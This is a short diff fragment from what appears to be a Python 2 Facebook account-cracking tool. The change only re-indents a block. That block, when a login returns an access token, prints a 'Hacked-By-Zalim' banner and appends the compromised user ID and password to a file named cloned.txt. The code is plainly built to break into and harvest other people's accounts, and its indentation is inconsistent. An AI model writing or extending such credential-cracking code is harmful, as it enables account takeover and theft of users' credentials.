@@ -282,11 +282,11 @@ def action():
             q = json.load(data)
             if 'access_token' in q:
             jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
-            print '\x1b[1;93m(HaHa-Hacked)  ' + k + c + user +  '  |  ' + pass1                                    
-            okb = open('save/cloned.txt', 'a')
-            okb.write(k+c+user+pass1+'\n')
-            okb.close()
-            oks.append(c+user+pass1)
+               print '\x1b[1;93m(HaHa-Hacked)  ' + k + c + user +  '  |  ' + pass1                                    
+               okb = open('save/cloned.txt', 'a')
+               okb.write(k+c+user+pass1+'\n')
+               okb.close()
+               oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
                 jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
